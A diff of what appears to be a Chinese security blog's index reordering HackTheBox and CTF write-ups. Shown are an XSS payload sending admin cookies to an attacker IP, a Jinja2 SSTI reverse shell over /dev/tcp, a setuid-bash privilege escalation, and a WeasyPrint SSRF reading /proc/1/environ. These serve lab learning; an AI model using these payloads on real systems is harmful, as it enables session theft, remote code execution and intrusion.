-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ! /usr/bin/pgrep -x &quot;initdb.sh&quot; &amp;&gt;/dev/null; then</span><br><span class="line">  /usr/bin/echo &quot;Database service is not running. Starting it...&quot;</span><br><span class="line">  ./initdb.sh 2&gt;/dev/null</span><br><span class="line">else</span><br><span class="line">  /usr/bin/echo &quot;Database service is running.&quot;</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>
-
-<p>这段代码大概意思就是，if语句先使用pgrep命令检测<code>initdb.sh</code>是否存在，如果不存在则执行该sh文件并丢弃错误输出</p>
-<p>而我们在根目录下并没有找到该sh文件，那么我们可以简单利用一下</p>
-<ol>
-<li><p>首先创建<code>initdb.sh</code>文件，写入提升权限的命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;chmod u+s /bin/bash&quot; &gt; initdb.sh</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>然后赋予该sh脚本的执行权限</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x initdb.sh</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>最后sudo执行<code>/usr/bin/syscheck</code>，成功运行sh脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/syscheck</span><br></pre></td></tr></table></figure></li>
-</ol>
-<p><img src="/article/Headless-HackTheBox/image-20240331181954932.png"></p>
-<p>运行sh脚本后，用-p参数启动<code>Bash Shell</code>并以特权模式运行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/bash -p</span><br></pre></td></tr></table></figure>
-
-<p>得到root的flag</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331182210478.png"></p>
-]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>HackTheBox</tag>
-        <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>IClean-HackTheBox</title>
-    <url>/article/IClean-HackTheBox.html</url>
-    <content><![CDATA[<p>XSS跨站脚本攻击、SSTI模板注入</p>
-<span id="more"></span>
-
-<h1 id="IClean-HackTheBox"><a href="#IClean-HackTheBox" class="headerlink" title="IClean-HackTheBox"></a>IClean-HackTheBox</h1><p><strong>信息搜集</strong></p>
-<p>nmap扫描一下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -v 10.10.11.12 -Pn</span><br></pre></td></tr></table></figure>
-
-<p>扫描结果</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
-
-<p>访问80端口，发现跳转到<code>capiclean.htb</code>，添加下<code>/etc/hosts</code></p>
-<p>扫描目录，可以发现<code>/dashboard</code>路由可以，应该是经过身份验证跳转到<code>/</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[22:00:12] 200 -    2KB - /about                                            </span><br><span class="line">[22:01:03] 302 -  189B  - /dashboard  -&gt;  /                                 </span><br><span class="line">[22:01:34] 200 -  711B  - /login                                            </span><br><span class="line">[22:01:35] 302 -  189B  - /logout  -&gt;  /                                    </span><br><span class="line">[22:02:15] 403 -  278B  - /server-status/                                   </span><br><span class="line">[22:02:16] 403 -  278B  - /server-status                                    </span><br><span class="line">[22:02:17] 200 -    8KB - /services</span><br></pre></td></tr></table></figure>
-
-<p>我们在<code>/choose</code>路由下点击<code>get a quote</code></p>
-<p><img src="/article/IClean-HackTheBox/image-20240517223255102.png"></p>
-<p>勾选上去抓包，测试各个参数是否存在注入</p>
-<p>在service参数成功测试出存在xss注入</p>
-<p>（xss注入的payload均url编码过）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=http://10.10.14.54/&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/IClean-HackTheBox/image-20240517223604205.png"></p>
-<p>我们尝试读取下管理员cookie</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=fetch(&#x27;http://10.10.14.54/&#x27;+document.cookie);&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/IClean-HackTheBox/image-20240517223817967.png"></p>
-<p>得到cookie后我们来验证一下，使用cookie成功访问<code>/dashboard</code></p>
-<p><img src="/article/IClean-HackTheBox/image-20240517224029471.png"></p>
-<p>我们按照<code>Generate Invoice =&gt; Generate QR</code>顺序</p>
-<p>先生成<code>Invoice ID generated: 1223131481</code>，然后在第二步输入ID后点击<code>Genrate</code>会生成下面的<code>QR Code Link</code></p>
-<p>我们抓包看看，注意到<code>qr_link</code>的值出现在img标签中</p>
-<p><img src="/article/IClean-HackTheBox/image-20240517224817039.png"></p>
-<p>经过测试该参数存在SSTI模板注入</p>
-<p><img src="/article/IClean-HackTheBox/image-20240517224936946.png"></p>
-<p>回显49应该就是Jinja2，直接payload测试一下（<code>__</code>直接unicode编码一下）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;lipsum|attr(&quot;\x5f\x5fglobals\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;id&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/IClean-HackTheBox/image-20240517230157254.png"></p>
-<p>直接反弹shell（注意bash命令URL编码一下）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;lipsum|attr(&quot;\x5f\x5fglobals\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/1010.14.54/1028 0&gt;&amp;1&#x27;&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/IClean-HackTheBox/image-20240517230503070.png"></p>
-<p>先提升下shell权限</p>
-<p>然后在<code>/opt/app/app.py</code>找到数据库信息</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Database Configuration</span><br><span class="line">db_config = &#123;</span><br><span class="line">    &#x27;host&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;user&#x27;: &#x27;iclean&#x27;,</span><br><span class="line">    &#x27;password&#x27;: &#x27;pxCsmnGLckUb&#x27;,</span><br><span class="line">    &#x27;database&#x27;: &#x27;capiclean&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>直接本地连接数据库<code>mysql -u iclean -p -h localhost</code>，找到consuela的密码</p>
-<p><img src="/article/IClean-HackTheBox/image-20240517232043106.png"></p>
-<p>先识别一下是什么加密，然后john爆破记得加上format</p>
-<p><img src="/article/IClean-HackTheBox/image-20240517232013033.png"></p>
-<p>拿到密码<code>simple and clean</code>后直接ssh连接就行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh consuela@10.10.11.12</span><br></pre></td></tr></table></figure>
-
-<p>拿到user的flag</p>
-<p><img src="/article/IClean-HackTheBox/image-20240517232330110.png"></p>
-<p>然后我们<code>sudo -l</code>查看下可用的命令</p>
-<p><img src="/article/IClean-HackTheBox/image-20240517232526293.png"></p>
-<p>用strings命令查看发现内容存在<code>--help</code>参数，网上搜索发现qpdf是一个内容转换工具，有对应的使用文档</p>
-<p>我们可以利用其参数读取root的flag（注意要在tmp目录下才能下载root.txt）</p>
-<p><img src="/article/IClean-HackTheBox/image-20240517233227496.png"></p>
-]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>HackTheBox</tag>
-        <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Hospital-HackTheBox</title>
     <url>/article/Hospital-HackTheBox.html</url>
     <content><![CDATA[<p>Ubuntu内核版本漏洞提权、CVE-2023-36664</p>
@@ -989,6 +917,112 @@
       </tags>
   </entry>
   <entry>
+    <title>IClean-HackTheBox</title>
+    <url>/article/IClean-HackTheBox.html</url>
+    <content><![CDATA[<p>XSS跨站脚本攻击、SSTI模板注入</p>
+<span id="more"></span>
+
+<h1 id="IClean-HackTheBox"><a href="#IClean-HackTheBox" class="headerlink" title="IClean-HackTheBox"></a>IClean-HackTheBox</h1><p><strong>信息搜集</strong></p>
+<p>nmap扫描一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -v 10.10.11.12 -Pn</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<p>访问80端口，发现跳转到<code>capiclean.htb</code>，添加下<code>/etc/hosts</code></p>
+<p>扫描目录，可以发现<code>/dashboard</code>路由可以，应该是经过身份验证跳转到<code>/</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[22:00:12] 200 -    2KB - /about                                            </span><br><span class="line">[22:01:03] 302 -  189B  - /dashboard  -&gt;  /                                 </span><br><span class="line">[22:01:34] 200 -  711B  - /login                                            </span><br><span class="line">[22:01:35] 302 -  189B  - /logout  -&gt;  /                                    </span><br><span class="line">[22:02:15] 403 -  278B  - /server-status/                                   </span><br><span class="line">[22:02:16] 403 -  278B  - /server-status                                    </span><br><span class="line">[22:02:17] 200 -    8KB - /services</span><br></pre></td></tr></table></figure>
+
+<p>我们在<code>/choose</code>路由下点击<code>get a quote</code></p>
+<p><img src="/article/IClean-HackTheBox/image-20240517223255102.png"></p>
+<p>勾选上去抓包，测试各个参数是否存在注入</p>
+<p>在service参数成功测试出存在xss注入</p>
+<p>（xss注入的payload均url编码过）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=http://10.10.14.54/&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/IClean-HackTheBox/image-20240517223604205.png"></p>
+<p>我们尝试读取下管理员cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=fetch(&#x27;http://10.10.14.54/&#x27;+document.cookie);&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/IClean-HackTheBox/image-20240517223817967.png"></p>
+<p>得到cookie后我们来验证一下，使用cookie成功访问<code>/dashboard</code></p>
+<p><img src="/article/IClean-HackTheBox/image-20240517224029471.png"></p>
+<p>我们按照<code>Generate Invoice =&gt; Generate QR</code>顺序</p>
+<p>先生成<code>Invoice ID generated: 1223131481</code>，然后在第二步输入ID后点击<code>Genrate</code>会生成下面的<code>QR Code Link</code></p>
+<p>我们抓包看看，注意到<code>qr_link</code>的值出现在img标签中</p>
+<p><img src="/article/IClean-HackTheBox/image-20240517224817039.png"></p>
+<p>经过测试该参数存在SSTI模板注入</p>
+<p><img src="/article/IClean-HackTheBox/image-20240517224936946.png"></p>
+<p>回显49应该就是Jinja2，直接payload测试一下（<code>__</code>直接unicode编码一下）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;lipsum|attr(&quot;\x5f\x5fglobals\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;id&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/IClean-HackTheBox/image-20240517230157254.png"></p>
+<p>直接反弹shell（注意bash命令URL编码一下）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;lipsum|attr(&quot;\x5f\x5fglobals\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/1010.14.54/1028 0&gt;&amp;1&#x27;&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/IClean-HackTheBox/image-20240517230503070.png"></p>
+<p>先提升下shell权限</p>
+<p>然后在<code>/opt/app/app.py</code>找到数据库信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Database Configuration</span><br><span class="line">db_config = &#123;</span><br><span class="line">    &#x27;host&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;user&#x27;: &#x27;iclean&#x27;,</span><br><span class="line">    &#x27;password&#x27;: &#x27;pxCsmnGLckUb&#x27;,</span><br><span class="line">    &#x27;database&#x27;: &#x27;capiclean&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接本地连接数据库<code>mysql -u iclean -p -h localhost</code>，找到consuela的密码</p>
+<p><img src="/article/IClean-HackTheBox/image-20240517232043106.png"></p>
+<p>先识别一下是什么加密，然后john爆破记得加上format</p>
+<p><img src="/article/IClean-HackTheBox/image-20240517232013033.png"></p>
+<p>拿到密码<code>simple and clean</code>后直接ssh连接就行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh consuela@10.10.11.12</span><br></pre></td></tr></table></figure>
+
+<p>拿到user的flag</p>
+<p><img src="/article/IClean-HackTheBox/image-20240517232330110.png"></p>
+<p>然后我们<code>sudo -l</code>查看下可用的命令</p>
+<p><img src="/article/IClean-HackTheBox/image-20240517232526293.png"></p>
+<p>用strings命令查看发现内容存在<code>--help</code>参数，网上搜索发现qpdf是一个内容转换工具，有对应的使用文档</p>
+<p>我们可以利用其参数读取root的flag（注意要在tmp目录下才能下载root.txt）</p>
+<p><img src="/article/IClean-HackTheBox/image-20240517233227496.png"></p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>HackTheBox</tag>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ISCC2024-数据泄露</title>
+    <url>/article/ISCC2024-%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2.html</url>
+    <content><![CDATA[<p>ISCC2024擂台赛的一道流量分析题，和内网渗透中搭建隧道事件有关</p>
+<span id="more"></span>
+
+<h2 id="数据泄露"><a href="#数据泄露" class="headerlink" title="数据泄露"></a>数据泄露</h2><p><strong>题目要求</strong></p>
+<blockquote>
+<p>公司主机被攻击了，请根据流量文件，找到攻击者所使用的 DNS 隧道工具的原始文件名。请提交文件名的小写md5</p>
+</blockquote>
+<p>打开文件发现存在大量DNS的数据包，筛选一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dns &amp;&amp; ip.src==192.168.157.144</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503205838886.png" alt="image-20240503205838886"></p>
+<p>发现这些包非常大，并且对应域名过长</p>
+<p><strong>明显的 dnscat2 流量特征（解析域名过长，使用 CNAME、TXT、MX 记录的查询）</strong></p>
+<p>我们导出为纯文本文件</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503210020711.png" alt="image-20240503210020711"></p>
+<p>将域名<code>microsofto365.com</code>前面部分提取出来（就提取的前面几部分）</p>
+<p>解码脚本如下 <a href="https://bbs.sangfor.com.cn/forum.php?mod=viewthread&tid=265941">参考文章</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hex_string=&#x27;1ae6012ec72fe4b1f14d6963726f736f66742057696e646f7773205b5665&#x27;</span><br><span class="line">hex_string=hex_string.replace(&#x27;.&#x27;,&#x27;&#x27;)</span><br><span class="line">#将字符按照每两个字符分组，转换成十六进制数</span><br><span class="line">hex_parts=[hex_string[i:i+2] for i in range(0,len(hex_string),2)]</span><br><span class="line"></span><br><span class="line">#转换成ascii字符</span><br><span class="line">ascii_result=&#x27;&#x27;.join(chr(int(hex,16)) for hex in hex_parts)</span><br><span class="line">print(ascii_result)</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503210239942.png" alt="image-20240503210239942"></p>
+<p>注意到DNS隧道工具dnscat2，不过有乱码</p>
+<p>直接搜索引擎确定文件名</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503210351782.png" alt="image-20240503210351782"></p>
+<p>然后在线网站MD5加密一下，上面那个就是flag</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503210412841.png" alt="image-20240503210412841"></p>
+]]></content>
+      <categories>
+        <category>流量分析</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Jenkins文件读取漏洞(CVE-2024-23897)</title>
     <url>/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897.html</url>
     <content><![CDATA[<p>最近实在不知道做什么，跟着p神复现下比较火的漏洞</p>
@@ -1055,40 +1089,6 @@
 ]]></content>
       <categories>
         <category>漏洞分析</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>ISCC2024-数据泄露</title>
-    <url>/article/ISCC2024-%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2.html</url>
-    <content><![CDATA[<p>ISCC2024擂台赛的一道流量分析题，和内网渗透中搭建隧道事件有关</p>
-<span id="more"></span>
-
-<h2 id="数据泄露"><a href="#数据泄露" class="headerlink" title="数据泄露"></a>数据泄露</h2><p><strong>题目要求</strong></p>
-<blockquote>
-<p>公司主机被攻击了，请根据流量文件，找到攻击者所使用的 DNS 隧道工具的原始文件名。请提交文件名的小写md5</p>
-</blockquote>
-<p>打开文件发现存在大量DNS的数据包，筛选一下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dns &amp;&amp; ip.src==192.168.157.144</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503205838886.png" alt="image-20240503205838886"></p>
-<p>发现这些包非常大，并且对应域名过长</p>
-<p><strong>明显的 dnscat2 流量特征（解析域名过长，使用 CNAME、TXT、MX 记录的查询）</strong></p>
-<p>我们导出为纯文本文件</p>
-<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503210020711.png" alt="image-20240503210020711"></p>
-<p>将域名<code>microsofto365.com</code>前面部分提取出来（就提取的前面几部分）</p>
-<p>解码脚本如下 <a href="https://bbs.sangfor.com.cn/forum.php?mod=viewthread&tid=265941">参考文章</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hex_string=&#x27;1ae6012ec72fe4b1f14d6963726f736f66742057696e646f7773205b5665&#x27;</span><br><span class="line">hex_string=hex_string.replace(&#x27;.&#x27;,&#x27;&#x27;)</span><br><span class="line">#将字符按照每两个字符分组，转换成十六进制数</span><br><span class="line">hex_parts=[hex_string[i:i+2] for i in range(0,len(hex_string),2)]</span><br><span class="line"></span><br><span class="line">#转换成ascii字符</span><br><span class="line">ascii_result=&#x27;&#x27;.join(chr(int(hex,16)) for hex in hex_parts)</span><br><span class="line">print(ascii_result)</span><br></pre></td></tr></table></figure>
-
-<p>运行结果如下</p>
-<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503210239942.png" alt="image-20240503210239942"></p>
-<p>注意到DNS隧道工具dnscat2，不过有乱码</p>
-<p>直接搜索引擎确定文件名</p>
-<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503210351782.png" alt="image-20240503210351782"></p>
-<p>然后在线网站MD5加密一下，上面那个就是flag</p>
-<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503210412841.png" alt="image-20240503210412841"></p>
-]]></content>
-      <categories>
-        <category>流量分析</category>
       </categories>
   </entry>
   <entry>
@@ -1615,59 +1615,6 @@
       </tags>
   </entry>
   <entry>
-    <title>NSSRound#20 Basic</title>
-    <url>/article/NSSRound-20-Basic.html</url>
-    <content><![CDATA[<p>114514</p>
-<span id="more"></span>
-
-
-
-
-
-<h1 id="CSDN-To-PDF-V1-2"><a href="#CSDN-To-PDF-V1-2" class="headerlink" title="CSDN_To_PDF V1.2"></a>CSDN_To_PDF V1.2</h1><p>源码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask, request, jsonify, make_response, render_template, flash, redirect, url_for</span><br><span class="line">import re</span><br><span class="line">from flask_weasyprint import HTML, render_pdf</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">URL_REGEX = re.compile(</span><br><span class="line">    r&#x27;http(s)?://&#x27;  # http or https</span><br><span class="line">    r&#x27;(?:[a-zA-Z]|[0-9]|[$-_@.&amp;+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+&#x27;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">def is_valid_url(url):</span><br><span class="line">    if not URL_REGEX.match(url):</span><br><span class="line">        return False</span><br><span class="line">    if &quot;blog.csdn.net&quot; not in url:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def CsdnToPdf():</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        url = request.form.get(&#x27;url&#x27;)</span><br><span class="line">        # 当我不知道weasyprint会解析恶意 &lt;link attachment=xxx&gt;？</span><br><span class="line">        url = url.replace(&quot;html&quot;, &quot;&quot;)</span><br><span class="line">        if is_valid_url(url):</span><br><span class="line">            try:</span><br><span class="line">                html = HTML(url=url)</span><br><span class="line">                pdf = html.write_pdf()</span><br><span class="line">                response = make_response(pdf)</span><br><span class="line">                response.headers[&#x27;Content-Type&#x27;] = &#x27;application/pdf&#x27;</span><br><span class="line">                response.headers[&#x27;Content-Disposition&#x27;] = &#x27;attachment; filename=output.pdf&#x27;</span><br><span class="line"></span><br><span class="line">                return response</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return f&#x27;Error generating PDF&#x27;, 500</span><br><span class="line">        else:</span><br><span class="line">            return f&#x27;Invalid URL! Target web address: &#x27; + url</span><br><span class="line">    else:</span><br><span class="line">        return render_template(&quot;index.html&quot;), 200</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=8080)</span><br></pre></td></tr></table></figure>
-
-<p>题目是没有给源码的，我们从题目一步步分析</p>
-<p>打开页面，有一个PDF转换器</p>
-<p><img src="/article/NSSRound-20-Basic/image-20240401215914318.png"></p>
-<p>存在输入URL大概率有SSRF，随便给个vps的发现不行</p>
-<p><img src="/article/NSSRound-20-Basic/image-20240401220042448.png"></p>
-<p>结合转换器是转换CSDN的，那么路径应该要有CSDN</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://5i781963p2.yicp.fun/blog.csdn.net</span><br></pre></td></tr></table></figure>
-
-<p>测试成功，我们在vps上开启监听看看</p>
-<p>获得信息<code>WeasyPrint 61.2</code></p>
-<p><img src="/article/NSSRound-20-Basic/image-20240401220234808.png"></p>
-<p><strong>WeasyPrint</strong></p>
-<blockquote>
-<p>WeasyPrint是一个用于HTML和CSS的可视化渲染引擎，可以将HTML文档导出为打印标准的PDF文件</p>
-</blockquote>
-<p>我们可以借助HTML的标签实现文件读取 <a href="https://nahamsec.com/posts/my-expense-report-resulted-in-a-server-side-request-forgery-ssrf-on-lyft">参考文章</a></p>
-<p>查看源码可以注意到我们能够使用 <code>&lt;link rel=attachment href=&quot;file:///root/secret.txt&quot;&gt;</code>将任何网页或本地文件的内容附加到我们的 PDF 中</p>
-<p><img src="/article/NSSRound-20-Basic/image-20240401221004300.png"></p>
-<p>前面已经测试过存在SSRF，那么我们在vps上创建link.html文件然后去读取环境变量即可</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;link rel=&quot;attachment&quot; href=&quot;file:///proc/1/environ&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>回到题目，注意到源代码有个链接</p>
-<p><img src="/article/NSSRound-20-Basic/image-20240401223407178.png"></p>
-<p>结合css文件我们可以自己构造如下路径，并在vps上创建<code>blog.csdn.net</code>文件夹</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://5i781963p2.yicp.fun/blog.csdn.net/link.html</span><br></pre></td></tr></table></figure>
-
-<p>结果不行，我们把<code>blog.csdn.net</code>去掉再读发现html没了（应该是被替换成空）</p>
-<p>直接双写绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://5i781963p2.yicp.fun/blog.csdn.net/link.hthtmlml</span><br></pre></td></tr></table></figure>
-
-<p>得到pdf文件后用binwalk分离一下，得到flag</p>
-<p><img src="/article/NSSRound-20-Basic/image-20240401225931026.png"></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>比赛</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>NSSRound#18 Basic</title>
     <url>/article/NSSRound-18-Basic.html</url>
     <content><![CDATA[<p>session伪造、perl_startup提权</p>
@@ -1731,6 +1678,160 @@
       </categories>
       <tags>
         <tag>比赛</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NSSRound#20 Basic</title>
+    <url>/article/NSSRound-20-Basic.html</url>
+    <content><![CDATA[<p>114514</p>
+<span id="more"></span>
+
+
+
+
+
+<h1 id="CSDN-To-PDF-V1-2"><a href="#CSDN-To-PDF-V1-2" class="headerlink" title="CSDN_To_PDF V1.2"></a>CSDN_To_PDF V1.2</h1><p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask, request, jsonify, make_response, render_template, flash, redirect, url_for</span><br><span class="line">import re</span><br><span class="line">from flask_weasyprint import HTML, render_pdf</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">URL_REGEX = re.compile(</span><br><span class="line">    r&#x27;http(s)?://&#x27;  # http or https</span><br><span class="line">    r&#x27;(?:[a-zA-Z]|[0-9]|[$-_@.&amp;+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+&#x27;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">def is_valid_url(url):</span><br><span class="line">    if not URL_REGEX.match(url):</span><br><span class="line">        return False</span><br><span class="line">    if &quot;blog.csdn.net&quot; not in url:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def CsdnToPdf():</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        url = request.form.get(&#x27;url&#x27;)</span><br><span class="line">        # 当我不知道weasyprint会解析恶意 &lt;link attachment=xxx&gt;？</span><br><span class="line">        url = url.replace(&quot;html&quot;, &quot;&quot;)</span><br><span class="line">        if is_valid_url(url):</span><br><span class="line">            try:</span><br><span class="line">                html = HTML(url=url)</span><br><span class="line">                pdf = html.write_pdf()</span><br><span class="line">                response = make_response(pdf)</span><br><span class="line">                response.headers[&#x27;Content-Type&#x27;] = &#x27;application/pdf&#x27;</span><br><span class="line">                response.headers[&#x27;Content-Disposition&#x27;] = &#x27;attachment; filename=output.pdf&#x27;</span><br><span class="line"></span><br><span class="line">                return response</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return f&#x27;Error generating PDF&#x27;, 500</span><br><span class="line">        else:</span><br><span class="line">            return f&#x27;Invalid URL! Target web address: &#x27; + url</span><br><span class="line">    else:</span><br><span class="line">        return render_template(&quot;index.html&quot;), 200</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=8080)</span><br></pre></td></tr></table></figure>
+
+<p>题目是没有给源码的，我们从题目一步步分析</p>
+<p>打开页面，有一个PDF转换器</p>
+<p><img src="/article/NSSRound-20-Basic/image-20240401215914318.png"></p>
+<p>存在输入URL大概率有SSRF，随便给个vps的发现不行</p>
+<p><img src="/article/NSSRound-20-Basic/image-20240401220042448.png"></p>
+<p>结合转换器是转换CSDN的，那么路径应该要有CSDN</p>
